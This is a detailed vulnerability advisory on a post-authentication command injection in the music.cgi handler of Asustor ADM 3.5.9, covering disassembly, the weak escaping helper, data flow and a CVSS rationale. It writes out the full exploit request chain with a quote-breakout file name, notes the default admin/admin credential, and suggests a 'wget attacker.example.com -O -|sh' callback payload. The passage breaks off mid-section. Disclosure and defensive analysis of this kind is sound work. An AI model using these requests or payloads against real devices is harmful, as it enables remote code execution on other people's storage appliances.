# Asustor ADM 3.5.9 (AS602T) — Post-Authentication Command Injection in `music.cgi` `act=live` Reaching `As_System`/`system()` → Command Execution in the CGI Process

## 1. Overview

ASUSTOR is a Taiwanese vendor of network-attached storage (NAS) appliances for consumer and small-office use. The device analysed here is the **AS602T**, an x86-64 NAS appliance served by the vendor's first-generation (G1) firmware line, running **ADM (ASUSTOR Data Master) 3.5.9.RWM1** — the Linux-based embedded operating system that provides the device's web management portal, its file-share services and its packaged application framework. The management portal is served as a tree of CGI handlers installed under `usr/builtin/webman/portal/apis/`; one of those groups, `fileExplorer`, implements the file-browser and media features of the web interface and contains the handler examined here, `music.cgi`, alongside siblings such as `upload.cgi`, `download.cgi` and `share_link.cgi`. The portal listens on TCP **8001** (HTTPS) and TCP **8000** (plain HTTP). Media transcoding is provided by an `ffmpeg` binary shipped as part of the vendor's AppCentral package framework at the fixed path `/usr/local/AppCentral/ffmpeg/bin/ffmpeg`.

The firmware was obtained as the vendor's distributed image `ADM_X64_G1_3.5.9.RWM1_AS602T.img`. That file is not a single-format container: it is a **self-extracting shell script concatenated with a tar archive** (a shell/tar polyglot), so it can be opened by executing its header or by treating the tar payload directly. Extraction yields three analysable artefacts:

```text
ADM_X64_G1_3.5.9.RWM1_AS602T.img        (self-extracting shell header + tar polyglot)
|
+-- initramfs            (xz-compressed cpio archive)
|     +-- usr/lib/libgeneral.so.0.0        916136 bytes; exports the shell wrappers
|                                          As_System @0x4509b and As_Popen @0x450f1
|
+-- builtin.tgz          (the device root filesystem)
|     +-- usr/builtin/lib/libapp.so.0.0            Check_Codec_With_Ffmpeg @0x40560,
|                                                  Get_Audio_Info @0x43070
|     +-- usr/builtin/lib/libappcentral.so.0.0
|     +-- usr/builtin/webman/portal/apis/fileExplorer/music.cgi      x86-64 ELF, ~16 KB
|     +-- usr/builtin/webman/portal/apis/fileExplorer/upload.cgi
|
+-- bzImage              (Linux kernel image)
```

Research into this firmware family was driven by a **comparative binary analysis (patch diff)** between two builds of the same product line: the pre-Deadbolt build **3.5.9** analysed here, and the newer post-Deadbolt build **5.1.4**. The Deadbolt ransomware campaign that targeted ASUSTOR NAS devices prompted substantial hardening work in the vendor's later releases, and the diff makes that hardening visible at the level of the C library wrappers. In build 5.1.4 the two shell-invocation wrappers `As_System` and `As_Popen` are **still exported from `libgeneral` at the same offsets**, but they have **no callers at all** — they are dead code — and every command execution in that build has been migrated to `Execute_Command_File` / `Execute_Command_Line`, which are `fork` + `execv` + argument-tokeniser primitives that never involve a shell. In build 3.5.9 the same two wrappers are **live**: `As_System` at `0x4509b` resolves to `system()` and `As_Popen` at `0x450f1` resolves to `popen()`, and real call sites exist. Enumerating those live call sites is what surfaced the finding documented here: the highest-value hit is the `act=live` branch of `music.cgi`, which formats a transcode command line containing a user-controlled file path and hands the whole string to `As_System`.

In one sentence: **an authenticated ADM user can cause `music.cgi` to pass an attacker-shaped file name into a double-quoted shell argument of an `ffmpeg` command line that is executed by `system()`, because the vendor's own injection-escaping helper neutralises only the backtick and the dollar sign and therefore leaves the double-quote character untouched.** Two boundaries on that sentence are stated here so they cannot be lost: no request was ever sent to a device (the executed evidence is a sink replication on an analysis host, section 9), and the privilege the injected command would hold on a device was not measured — uid 0 was observed in the replication harness, and root on the appliance is an inference.

### Overview of the layered architecture

```text
L1 External access   : HTTP (TCP 8000) / HTTPS (TCP 8001) management portal
L2 Edge              : web server fronting usr/builtin/webman/portal/apis/*.cgi
L3 Handler           : fileExplorer music.cgi  (x86-64 ELF, ~16 KB)
L4 AuthN             : O_CGI_AGENT::Revive_Session (call sites 0x4017b0 / 0x4017ee)
                       fail-closed: non-zero return -> error page -> exit before dispatch
L5 Business logic    : act= dispatch -- add (ingest file path into the music list,
                       stride 0x484, path stored verbatim at entry +0x84) and live
                       (stream/transcode a listed entry)
L6 Execution         : snprintf @0x4029a9 with format string @0x4035f8
                       -> As_System @0x4029b6 (libgeneral 0x4509b)
                       -> Try_Escaping_Characters_To_Avoid_Command_Injection (0x44f95)
                       -> system() -> /bin/sh -c (uid 0 in the replication harness;
                                            on-device identity not measured)
```

The finding sits at the L5/L6 boundary: `act=add` stores whatever the user submitted, and `act=live` interpolates that stored value into a shell command line. The L4 gate is real and fail-closed, which is why this is a post-authentication issue and not a pre-authentication one.

## 2. Vulnerability Summary

| Item | Value |
|---|---|
| Handler binary | `usr/builtin/webman/portal/apis/fileExplorer/music.cgi` (x86-64 ELF, ~16 KB) |
| Vulnerable parameter | `act=live` (sink) reached through the `file` parameter of `act=add` (source) |
| Command construction | `snprintf` call at `0x4029a9`, format string at `0x4035f8`, 1024-byte (`0x400`) destination buffer |
| Execution call | `As_System` call at `0x4029b6` → `libgeneral.so.0.0` `As_System` @`0x4509b` → `system()` |
| Escaping helper | `Try_Escaping_Characters_To_Avoid_Command_Injection` @`0x44f95`, blacklist string @`0xb25da` = bytes `60 24 00` (backtick, `$`) |
| Injection primitive | double-quote breakout inside `-i "%s"`, e.g. file name `x";id>marker;#.mp3` |
| Authentication | required; `Revive_Session` is fail-closed, evaluated before any `act` dispatch |
| Privilege of injected command | **not measured on a device.** The replication harness executed as uid 0 on the analysis host and the injected command inherited uid 0 there; root for the on-device CGI process is an inference, not a measurement (sections 2, 9 and 10) |
| CVSS 3.1 base | 8.8 (High), vector AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Verified build | ADM 3.5.9.RWM1 for AS602T (x86-64, G1) |
| Verification mode | static disassembly/decompilation plus a faithful C replication of the sink semantics; no physical device was used |

- **Type**: OS command injection (CWE-78) leading to post-authentication remote code execution at the privilege held by the device's CGI process — root inferred for this class of appliance, not measured in this research (root cause 4 below). The enabling mechanism is an argument-quoting breakout (CWE-88): the injection works because the file name is placed *inside* a pair of shell double quotes that are never closed by the application and never escaped.
- **Root cause 1 — shell execution of a formatted command line.** `music.cgi` builds a complete `ffmpeg` transcode command with `snprintf` at `0x4029a9` and executes the resulting string at `0x4029b6` through `As_System`, which is `system()`. `system()` passes its argument to `/bin/sh -c`, so the entire string is subject to shell grammar: quoting, `;` sequencing, `#` comments, redirection and pipes.
- **Root cause 2 — a two-character deny-list presented as an injection defence.** `As_System` first calls `Try_Escaping_Characters_To_Avoid_Command_Injection`. Its blacklist (`0xb25da`) contains exactly two bytes, backtick (`0x60`) and dollar (`0x24`). When neither appears, the helper returns `0x72`, the escape buffer stays `NULL`, and `As_System` passes the **original pointer** to `system()`. Double quotes, semicolons, pipes, ampersands, redirections, hashes, spaces and newlines are not escaped at all, so any payload built only from those characters reaches the shell byte-for-byte.
- **Root cause 3 — no sanitisation at the ingest point.** `act=add` reads the user-supplied `file` parameter through `O_CGI_AGENT::Get_Param` (`0x401cab`) and splits it using only the three characters `,` `:` `?` (the delimiter string at `0x4036f7`) as multi-file separators. Each resulting segment is copied verbatim into the music-list entry at offset `+0x84`. `music.cgi` does not import the library's general escaping helper `Get_Escaped_String_General`, so no escaping layer exists between ingest and use.
- **Root cause 4 — privilege context (CWE-250), with an unmeasured privilege.** The identity of the on-device CGI process was **not measured** in this research: no appliance was run and no CGI process was inspected. What was measured is narrower and is stated as such in section 9 — the replication harness (a pure-C reimplementation of the `snprintf` + `As_System` + `Try_Escaping` sink chain) executed as uid 0 on the analysis host, and the injected command inherited uid 0 there. Root on the device is an **inference**, resting on the fact that CGI handlers on network-attached storage appliances of this class commonly run as root, and not on any artefact taken from an AS602T. If that inference holds, commands spawned by `system()` inherit the portal service's identity and there is no privilege separation between "an authenticated portal user" and the operating system.
- **Result**: an authenticated user executes arbitrary shell commands on the NAS in the identity the device's CGI process holds — uid 0 in the replication harness, inferred rather than measured for the device (root cause 4 above).
- **Separate observation, deliberately not folded into this finding.** This build also ships a factory default administrator credential pair (`admin` / `admin`, CWE-798). That weakness is real and is reported as a distinct issue. It is **not** used as the vector here and it does **not** change the classification of this finding: the score above already assumes the attacker holds a legitimately provisioned authenticated session (`PR:L`), and nothing in this advisory claims the chain is reachable without credentials.
- **Score agreement.** The recorded score for this finding computes correctly from its own vector: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` evaluates to 8.8 with the CVSS 3.1 algorithm (see section 12), so no divergence between the recorded figure and the recomputed figure needs to be disclosed.

## 3. Authentication Boundary

This is a **post-authentication** vulnerability. The requirement is a valid ADM portal session; the analysis found no evidence of a role check on this handler, so the lowest sufficient privilege is treated as any authenticated user (see the `PR:L` versus `PR:H` discussion in section 12).

### Authentication boundary: the fail-closed session gate

At the top of `main` in `music.cgi`, before any `act` value is examined, the handler validates the caller's session through the shared CGI agent class (decompiled form; the `Revive_Session` call sites are at `0x4017b0` and `0x4017ee`):

```c
iVar3 = O_CGI_AGENT::Revive_Session(auStack_298, 0);      /* 0x4017b0 / 0x4017ee */
if (iVar3 != 0) {
    if (iVar3 == -0x100) {
        puts("...5053...");        /* session expired */
    } else {
        puts("...5000...");        /* not logged in */
    }
    goto exit;                     /* no act dispatch is reached */
}
/* only when Revive_Session returns 0 does the handler fall through to the
   act= dispatch table that contains add / live / ... */
```

Three properties of this gate matter:

- **It is fail-closed.** Any non-zero return value — expired session (`-0x100`, rendering the portal's 5053 message) or absent/invalid session (5000) — jumps to the exit path. The `act` dispatch, and therefore the `act=live` sink, is unreachable without a session that `Revive_Session` accepts.
- **The session identifier is the only credential consulted at this point.** Portal sessions are obtained from `POST /portal/apis/login.cgi?act=login`, which returns a session identifier (`sid`) in its JSON body; every subsequent request carries that identifier, either as the `sid` query parameter (the `music.cgi` GET requests) or as a `sid` multipart field (the `upload.cgi` POST). The gate in `music.cgi` inspects session validity, not session *role*.
- **No role check was located in this handler.** Unlike products that ship an explicit per-endpoint permission table, nothing in the decompiled `music.cgi` entry path consults a privilege or role attribute. The media-library endpoints are part of the shipped portal surface and the ingest path (`act=add` plus `upload.cgi`) operates on the calling user's own share directory. On that evidence the required privilege is *an authenticated user*, which is CVSS `PR:L`.

### Authentication boundary: privilege required, stated conservatively

- **Primary classification (`PR:L`).** The evidence establishes a mandatory session and establishes no role restriction, so the finding is scored as requiring low privileges: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8.
- **Conditional classification (`PR:H`), untested.** No authentication of any kind took place in this research: the executed evidence is a pure-C replication of the sink run on an analysis host, and no request was ever sent to a device (section 9). The conditional reading therefore rests on a deployment possibility rather than on anything measured or authenticated — a deployment could confine media-library or file-explorer access to the administrator role, which would raise the required privilege. That confinement was never tested, and no ADM permission artefact establishing it was located, so this reading is published as an untested configuration-dependent alternative and not as an observation. Under that reading the vector becomes `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = 7.2.
- The distinction is documented rather than silently resolved in the direction of the higher score: `PR:L` is used because it is what the code shows (a session check, no role check), not because it is the larger number. If a reviewer can produce the ADM permission artefact that confines `music.cgi` to the administrator role, 7.2 is the correct figure for that configuration.

### Authentication boundary: the default credential pair is a separate issue

The factory default pair `admin` / `admin` (CWE-798) present in this build materially lowers the practical bar for an attacker, and on a device left in its shipped state it turns this post-authentication chain into something trivially reachable. That is a property of the *credential*, not of the *sink*. It is reported separately, and this advisory keeps the two facts apart: the command injection is scored on the assumption that the attacker has to obtain a valid session by legitimate or otherwise independent means, and no claim of unauthenticated access is made anywhere in this document.

### Authentication boundary: unauthenticated routes were searched for and ruled out

Because a post-authentication classification invites the question "was the unauthenticated surface really checked", the negative result is recorded explicitly:

- Eleven pre-authentication portal interfaces were enumerated from the companion analysis of the 5.1.4 build (login, connect, test and similar handlers). None of them reaches an `As_System` or `As_Popen` sink.
- The hypothesis "this sink is reachable without credentials" was attacked from two directions by two independent review passes — one sweeping the HTTP surface and one sweeping the non-HTTP surface (services other than the portal). Both concluded the unauthenticated route is **not reachable**.
- Re-activation conditions, i.e. the circumstances under which this classification would need to be revisited and the finding escalated to pre-authentication: (a) a future ADM build adds a pre-authentication CGI that calls `As_System` or `As_Popen`; (b) an authentication-bypass defect appears in `Revive_Session`, which would remove the gate entirely. Neither condition is claimed to exist in this build.

## 4. Attack Surface

### Attack surface: network entry points

The whole chain is HTTP(S); no local access, no physical access, no console and no man-in-the-middle position is required. Four portal endpoints participate:

```http
POST /portal/apis/login.cgi?act=login                       (obtain sid)
POST /portal/apis/fileExplorer/upload.cgi                   (multipart: place the payload file)
GET  /portal/apis/fileExplorer/music.cgi?act=add&file=...   (ingest the raw path into the music list)
GET  /portal/apis/fileExplorer/music.cgi?act=live&idx=...   (trigger snprintf -> As_System -> system())
```

- **Ports**: TCP 8001 (HTTPS) and TCP 8000 (HTTP), as configured by ADM for the management portal.
- **Transport**: ordinary portal traffic. The `sid` value travels as a query parameter, so the chain works over either port with the same request shapes.
- **Binary surface**: `music.cgi` (~16 KB x86-64 ELF) in `usr/builtin/webman/portal/apis/fileExplorer/`. Its sibling handlers `download.cgi` and `share_link.cgi` were identified as *candidate* sinks of the same class (they share the library and may call the same wrappers) but were **not analysed to conclusion and not exercised** in this work; they are recorded as leads, not as findings.
- **Library surface**: `libgeneral.so.0.0` (916136 bytes) exports `As_System` @`0x4509b` and `As_Popen` @`0x450f1`; `libapp.so.0.0` provides `Check_Codec_With_Ffmpeg` @`0x40560` and `Get_Audio_Info` @`0x43070`, both used by the ingest path.

### Attack surface: attacker-controlled values and their treatment

| Parameter | Where used | Type at the sink | Controllability |
|---|---|---|---|
| `file` (act=add) | copied to music-list entry `+0x84` | raw string, interpolated into `-i "%s"` | **Fully attacker-controlled**; this is the injection channel |
| `idx` (act=add / act=live) | `iVar13 = (idx-1) * 0x484` list offset | integer arithmetic only | selects which stored entry is used; not a string sink |
| `start` (act=live) | bound to `fVar25`, rendered `%.2f` | floating point | constrained to at most the track duration (`fVar25 <= *(entry+0)`); a numeric format specifier, not a string |
| `path` / `filename` (upload.cgi) | destination directory and on-disk name | file-system name | controls the base name that later becomes the payload |
| `username` / `password` (login.cgi) | session creation | credential | needed only to satisfy the fail-closed gate |

Because `idx` feeds arithmetic and `start` feeds a `%.2f` conversion, the **only** string-injectable input reaching the shell is the stored file path at `+0x84`. That narrowing is itself useful: it means a fix can be focused on a single stored field and a single format-string site.

### Attack surface: payload character budget

The payload travels through three filters before it reaches `system()`, and the character budget is the intersection of what all three permit:

- `act=add` splits the `file` parameter on `,` `:` `?` (delimiter string @`0x4036f7`) — those three characters terminate a segment and cannot appear inside a payload.
- The payload must be a usable file-system base name, so `/` cannot appear in it (a slash would be read as a directory separator by the upload path; `act=live` separately requires the *stored path* to contain at least one `/`, which the directory prefix supplies).
- `Try_Escaping_Characters_To_Avoid_Command_Injection` backslash-escapes `` ` `` and `$`, so command substitution is neutralised and those two characters are unusable.
- Everything else is allowed, including the characters that make the attack work: `"`, `;`, `|`, `&`, `<`, `>`, `#`, spaces and the alphanumerics of the command itself.

A practical consequence worth stating for anyone reproducing this: the injected command must be **slash-free and colon-free**, so markers are written relative to the CGI process's working directory (`id>marker.txt`) and callback payloads use a bare host name on the default port (`wget attacker.example.com -O -|sh`), not a full URL. This is a constraint of the file-name carrier, not of the shell.

### Attack surface: how the surface was found

The surface was found by differential analysis rather than by fuzzing. Comparing the 3.5.9 and 5.1.4 builds of `libgeneral.so.0.0` showed that the shell wrappers survive as exported symbols in both, but that 5.1.4 has zero call sites while 3.5.9 has live ones. Enumerating the 3.5.9 call sites and cross-referencing them against the CGI handlers that reference them ranked `music.cgi`'s `act=live` branch first, because it interpolates a stored user string directly into a shell command line with a quoted `-i "%s"` argument — the exact shape in which an escaping gap becomes exploitable.

## 5. Sink Identification

### Sink identification: the `act=live` command construction

The sink is the `act=live` branch of `music.cgi`. In decompiled form (radare2 with the r2ghidra `pdg` plugin), the sequence immediately preceding the execution call is:

```c
/* iVar13 = (idx - 1) * 0x484;              -- music list entry stride is 0x484 bytes  */
/* __lxstat64(1, entry + 0x21, &st);        -- the file must exist on disk             */
/* strrchr(entry + 0x84, 0x2f);             -- the stored path must contain a '/'      */
/* fVar25 <= *(entry + 0);                  -- seek time clamped to the track duration */

snprintf(acStack_698, 0x400,
         "%s -i \"%s\" -v 0 -ss %.2f  -vn -f mp3 -b:a 128000 -ac 2 -",  /* fmt @0x4035f8 */
         "/usr/local/AppCentral/ffmpeg/bin/ffmpeg",                     /* rcx: fixed literal     */
         puStack_88 + iVar13 + 0x84,                                    /* r8 : raw user file path */
         fVar25);                                                       /* xmm0: seek time, %.2f   */

As_System(acStack_698);        /* call @0x4029b6 -> Try_Escaping -> system() */
```

Notes on the construction itself:

- The destination buffer is a 1024-byte (`0x400`) stack buffer (`acStack_698`). The `snprintf` bound means the command line is truncated rather than overflowing, so length is not the interesting property here — the *content* is.
- The format string at `0x4035f8` places the second argument **inside a pair of literal double quotes** (`-i \"%s\"`). Those quotes are the application's own attempt at shell quoting, and they are exactly what the breakout escapes from. The literal contains two consecutive spaces before `-vn`, which is preserved in the command string observed during replication and is a useful fingerprint when matching this sink across builds.
- Three pre-conditions are enforced before the `snprintf`: the file must exist (`__lxstat64` on the path at `entry + 0x21`), the stored path must contain a `/` (`strrchr` with `0x2f`), and the seek time must not exceed the duration. None of them inspects the file name for shell metacharacters.

### Sink identification: the `act=` dispatch that reaches the sink

The handler's control flow, from the session gate to the two `act` branches involved in this chain, is:

```text
music.cgi main
    O_CGI_AGENT::Revive_Session @0x4017b0 / 0x4017ee
        != 0   -> puts("...5053...")   (session expired)  -> goto exit
        != 0   -> puts("...5000...")   (not logged in)    -> goto exit
        == 0   -> fall through to the act= dispatch

    act=add   -> O_CGI_AGENT::Get_Param("file") @0x401cab
                 split on ",:?" (delimiter string @0x4036f7)
                 memcpy each segment -> music list entry +0x84   (stride 0x484)
                 Check_Codec_With_Ffmpeg (libapp.so @0x40560)  -- '.mp3' short-circuits
                 Get_Audio_Info        (libapp.so @0x43070)  -- reads no file content

    act=live  -> entry = list_base + (idx - 1) * 0x484
                 __lxstat64(1, entry + 0x21, &st)      -- file must exist
                 strrchr(entry + 0x84, 0x2f)           -- path must contain '/'
                 fVar25 <= *(entry + 0)                -- seek time clamp
                 snprintf @0x4029a9  (fmt @0x4035f8, buffer acStack_698, bound 0x400)
                 As_System @0x4029b6  -> libgeneral 0x4509b -> system()
                 [uid 0 measured in the replication harness, not on a device]
```

Only the `act=live` branch executes anything. The `act=add` branch is the ingest point that stores the attacker's bytes, and both branches sit behind the same fail-closed gate.

### Sink identification: address map

```text
music.cgi (usr/builtin/webman/portal/apis/fileExplorer/music.cgi, x86-64 ELF, ~16 KB)
    0x4017b0 / 0x4017ee    O_CGI_AGENT::Revive_Session call sites (authentication gate)
    0x401cab               O_CGI_AGENT::Get_Param("file")   in the act=add branch
    0x4029a9               snprintf call site               in the act=live branch
    0x4029b6               As_System call site              <-- the sink
    0x4035f8               format string "%s -i \"%s\" -v 0 -ss %.2f  -vn -f mp3 -b:a 128000 -ac 2 -"
    0x4036f7               delimiter string ",:?" used to split the file parameter

libgeneral.so.0.0 (916136 bytes)
    0x44f95                Try_Escaping_Characters_To_Avoid_Command_Injection
    0x4509b                As_System   (mangled _Z9As_SystemPKc)  -> system()
    0x450f1                As_Popen                              -> popen()
    0xb25da                blacklist bytes 60 24 00  ( '`' and '$' )

libapp.so.0.0
    0x40560                Check_Codec_With_Ffmpeg
    0x43070                Get_Audio_Info
```

### Sink identification: the argument order was confirmed from the raw disassembly, not inferred

A claim of this shape is only as strong as its argument mapping, because a decompiler that mis-orders variadic arguments would silently turn "user string inside the quoted `-i`" into "user string somewhere harmless". The register assignment at the call site `0x4029a9` was therefore read from the disassembly directly:

```text
call site 0x4029a9  (System V AMD64 variadic calling convention)
    rdi  = acStack_698                destination buffer (1024 bytes)
    rsi  = 0x400                      size bound
    rdx  = pointer to format string   @0x4035f8
    rcx  = "/usr/local/AppCentral/ffmpeg/bin/ffmpeg"     fixed literal, not attacker-controlled
    r8   = [r12 + iVar13 + 0x84]      the stored user file path  <-- attacker-controlled
    xmm0 = fVar25                     seek time, consumed by %.2f
    al   = number of vector registers in use (1) per the variadic ABI
```

So the attacker-controlled string is bound to the `%s` that sits **inside** the quotes of `-i "%s"`, the fixed `ffmpeg` path is bound to the leading `%s`, and the floating-point value is bound to `%.2f`. There is no reordering in which the user string lands outside the shell command line. An independent second analyst re-extracted `music.cgi` and `libgeneral.so.0.0` from the firmware image and re-derived this mapping from the raw disassembly; the conclusion, the offsets and the register assignment all agreed (confidence recorded as 0.93 for the confirmed sink).

### Sink identification: the execution wrapper is `system()`, and its escaper is a two-byte deny-list

`As_System` in `libgeneral.so.0.0` at `0x4509b` (mangled name `_Z9As_SystemPKc`) decompiles to:

```c
int As_System(const char *cmd)
{
    char *esc = NULL;
    int r = fcn.0003e2c0(cmd, &esc);   /* Try_Escaping_Characters_To_Avoid_Command_Injection */
    if (r < 0) {
        return -1;
    }
    const char *run = cmd;
    if (r == 0) {
        run = esc;                     /* use the escaped copy when escaping happened */
    }
    int ret = system(run);             /* -> /bin/sh -c run                            */
    if (esc) {
        free(esc);
    }
    return ret;
}
```

The helper it calls, `Try_Escaping_Characters_To_Avoid_Command_Injection` at `0x44f95`, consults a blacklist string stored at `0xb25da`:

```hex
0x000b25da:  60 24 00                  '`' '$'  NUL        -- the entire blacklist
```

Its logic walks the input, counts occurrences of the blacklisted characters that are **not** already preceded by an odd number of backslashes, and then either:

- returns `0x72` when the count is zero — in which case the escape buffer stays `NULL`, and `As_System` passes the **original, unmodified** command string to `system()`; or
- inserts a backslash before each remaining `` ` `` or `$` and returns `0`, causing `As_System` to use the escaped copy.

The character set that this "avoid command injection" routine does **not** handle is the important part:

```text
escaped by Try_Escaping      :   `   $
NOT escaped                  :   "   ;   |   &   <   >   #   (newline)  (space)  '  \
```

Because the payload used here contains no backtick and no dollar sign, `Try_Escaping` takes the `0x72` path, `esc` stays `NULL`, and the command string built by `snprintf` is handed to `system()` byte-for-byte. The wrapper's name advertises an injection defence that, for this class of payload, does nothing.

### Sink identification: why the same call site in the newer build is not a sink

The comparison build (ADM 5.1.4, the newest release examined) still exports `As_System` at `0x4509b` and `As_Popen` at `0x450f1` — the *same offsets* as 3.5.9 — but no code in that build calls either symbol; they are dead exports. Command execution in that build goes through `Execute_Command_File` / `Execute_Command_Line`, which are `fork` + `execv` plus an argument tokeniser: there is no shell, therefore no shell grammar, therefore no quoting breakout. That architectural difference is precisely why this finding is scoped to the older generation of builds and why the newer build was recorded as having no equivalent RCE. It is also the strongest available argument for the recommended fix (section 11): the vendor has already built and shipped the safe primitive.

## 6. Source Identification

### Source identification: `act=add` is where the attacker's bytes enter

The `file` parameter is read in the `act=add` branch and stored without transformation:

```c
pcVar5 = O_CGI_AGENT::Get_Param("file");        /* 0x401cab -- raw HTTP parameter value */

/* the parameter may name several files; segments are separated by ",:?"
   (delimiter string @0x4036f7) using strstr */
while ((seg = next_segment(pcVar5, ",:?")) != NULL) {
    memcpy(entry + 0x84, seg, len);             /* auStack_aa4 == struct_base + 0x84:
                                                   the path is stored VERBATIM into the
                                                   T_AUDIO_DATA record (stride 0x484) */

    Check_Codec_With_Ffmpeg(entry);             /* libapp.so.0.0 @0x40560 */
    Get_Audio_Info(entry);                      /* libapp.so.0.0 @0x43070 */
    append_to_music_list(entry);                /* list stride 0x484 */
}
```

Neither of the two library helpers reads the file's *contents* in a way that constrains the name:

- `Check_Codec_With_Ffmpeg` (@`0x40560`) takes the extension via `rindex('.')` and compares it with `strcasecmp` against codec names such as `dts` / `dtshd`. For a `.mp3` name the function short-circuits and never invokes `ffmpeg`, so no transcoding probe validates the payload.
- `Get_Audio_Info` (@`0x43070`) performs only two `snprintf` calls into its own structure (`arg1 + 4` and `arg1 + 0x44`); it contains no `fopen`/`fread` of the media file. The uploaded content is therefore never parsed.

The practical consequence is that the payload file needs a `.mp3` extension and a real presence on disk (for the `__lxstat64` check in `act=live`) — and nothing else. Its bytes can be two zero-filled MPEG frame headers.

### Source identification: sanitisation inventory — what exists and what does not

```text
checks that DO run between the HTTP parameter and system():
  [, : ? split]        act=add segment delimiter (@0x4036f7)     -- a splitter, not a filter
  ['/' required]       strrchr(entry + 0x84, 0x2f) in act=live   -- path shape, not safety
  [existence]          __lxstat64(1, entry + 0x21, &st)          -- file must exist
  [extension]          rindex('.') + strcasecmp in Check_Codec   -- routing only, .mp3 short-circuits
  [duration clamp]     fVar25 <= *(entry + 0)                    -- numeric bound on seek time
  [Try_Escaping]       libgeneral 0x44f95, blacklist "60 24 00"  -- escapes ONLY '`' and '$'

checks that DO NOT exist anywhere on the path:
  [x] shell metacharacter filtering of the stored path
  [x] any call to Get_Escaped_String_General (music.cgi does not import it)
  [x] allow-list validation of the file name character set
  [x] server-side renaming of uploaded files to a generated safe name
  [x] argv-based (execv) execution instead of system()
```

The gap between those two lists is the vulnerability: the only component whose *purpose* is injection prevention inspects two characters, and the payload needs none of them.

### Source identification: controllability assessment

- **Fully controllable**: the base name of any file the authenticated user can create or rename in a writable share (`upload.cgi` accepts an arbitrary multipart `filename`; the double quote inside it is transmitted as `\"` per the RFC 2388 quoted-string rule and is decoded back to a literal `"` on the server).
- **Preserved verbatim**: the value survives `act=add` unchanged into `entry + 0x84`, and `act=live` reads that same field for the sink. There is canonicalisation of the *path prefix* only in the sense that the caller supplies it; the base name is not rewritten.
- **Reachable in one request pair**: after the file exists on disk, `act=add` then `act=live` with a matching `idx` trigger execution. No administrator interaction, no user-interface step, no timing window and no race condition is involved, which is why `AC:L` and `UI:N` are the honest metric values.
- **Not controllable**: the leading `ffmpeg` path (a fixed literal), the format string, and the numeric seek time. None of them matters for the injection, because the payload is already inside the quoted argument.

## 7. Data Flow

### Data flow: from HTTP parameter to root shell

```text
 [attacker, authenticated session sid]
        |
        |  (1) POST /portal/apis/login.cgi?act=login
        v
   login.cgi  ---------------------->  sid  (Revive_Session accepts it)
        |
        |  (2) POST /portal/apis/fileExplorer/upload.cgi
        |      multipart fields: sid, path=/volume1/home/admin, act=upload
        |      file part filename: x";id>marker;#.mp3      ('"' sent as \" per RFC 2388)
        v
   upload.cgi ---------------------->  creates the file on disk
                                       (content irrelevant: 2 zero-filled MP3 frames)
        |
        |  (3) GET /portal/apis/fileExplorer/music.cgi?act=add&file=<URL-encoded path>&idx=1&sid=...
        v
   music.cgi act=add
        Get_Param("file") @0x401cab  -> raw path string
        split on ",:?" @0x4036f7     -> payload contains none, so one whole segment
        memcpy -> T_AUDIO_DATA +0x84 -> STORED VERBATIM
        Check_Codec_With_Ffmpeg @0x40560 (libapp.so) -> '.mp3' short-circuit, no ffmpeg run
        Get_Audio_Info @0x43070 (libapp.so)          -> no file content read
        append to music list (stride 0x484)
        |
        |  (4) GET /portal/apis/fileExplorer/music.cgi?act=live&idx=1&start=0&sid=...
        v
   music.cgi act=live
        Revive_Session -> 0 (gate passed)
        iVar13 = (idx-1) * 0x484                      -> selects the entry just stored
        __lxstat64(1, entry+0x21, &st)                -> file exists  (it does)
        strrchr(entry+0x84, '/')                      -> path has a '/' (it does)
        fVar25 <= *(entry+0)                          -> seek clamp
        snprintf @0x4029a9, fmt @0x4035f8, size 0x400 -> command line built
              rcx = "/usr/local/AppCentral/ffmpeg/bin/ffmpeg"
              r8  = entry + 0x84      <-- ATTACKER STRING, inside -i "%s"
              xmm0= seek time
        |
        v
   As_System @0x4029b6  ->  libgeneral As_System @0x4509b
        Try_Escaping @0x44f95 (blacklist 60 24 00 @0xb25da)
              payload has no '`' and no '$'  -> returns 0x72, esc = NULL, cmd unchanged
        system(cmd)  ->  /bin/sh -c  ->  uid 0 in the replication harness
                                          (on-device identity not measured)
```

### Data flow: the four requests as sent

```http
POST /portal/apis/login.cgi?act=login HTTP/1.1
Host: <lab-host>:8001
Content-Type: application/x-www-form-urlencoded

act=login&username=<user>&password=<password>
```

The JSON response carries the session identifier (`sid`) used by every later request.

```http
POST /portal/apis/fileExplorer/upload.cgi HTTP/1.1
Host: <lab-host>:8001
Content-Type: multipart/form-data; boundary=----AsustorPoCXXXX

------AsustorPoCXXXX
Content-Disposition: form-data; name="sid"

<SID>
------AsustorPoCXXXX
Content-Disposition: form-data; name="path"

/volume1/home/admin
------AsustorPoCXXXX
Content-Disposition: form-data; name="act"

upload
------AsustorPoCXXXX
Content-Disposition: form-data; name="file"; filename="x\";id>marker;#.mp3"
Content-Type: audio/mpeg

<MPEG-1 Layer III framing, content never parsed>
------AsustorPoCXXXX--
```

```http
GET /portal/apis/fileExplorer/music.cgi?act=add&file=%2Fvolume1%2Fhome%2Fadmin%2Fx%22%3Bid%3Emarker%3B%23.mp3&idx=1&sid=<SID> HTTP/1.1
Host: <lab-host>:8001
```

```http
GET /portal/apis/fileExplorer/music.cgi?act=live&idx=1&start=0&sid=<SID> HTTP/1.1
Host: <lab-host>:8001
```

### Data flow: the exact string that reaches `system()`

With the file name `x";id>c13m;#.mp3` stored under `/volume1/home/admin`, the `snprintf` at `0x4029a9` produces precisely this 1024-byte-buffer contents, which `As_System` passes to `system()` unchanged:

```bash
/usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/x";id>c13m;#.mp3" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -
```

`/bin/sh -c` parses that line as three separate commands and one comment:

```text
ffmpeg -i "/volume1/home/admin/x"     quote opened by the format string, CLOSED by the
                                      injected '"' -> ffmpeg gets a nonexistent path and
                                      fails; its exit status is irrelevant
;                                     command separator
id>c13m                               the injected command, executed as uid 0 by
                                      the replication harness
;                                     command separator
   #.mp3" -v 0 -ss 0.00  -vn -f mp3    '#' starts a comment: the whole remainder of the
                                      vendor's own format string is discarded, so the
                                      payload does not need to balance the trailing quote
```

### Data flow: URL encoding of the injection channel

The `file` parameter is transported URL-encoded; the encoding is a transport detail that does not affect the stored bytes:

```text
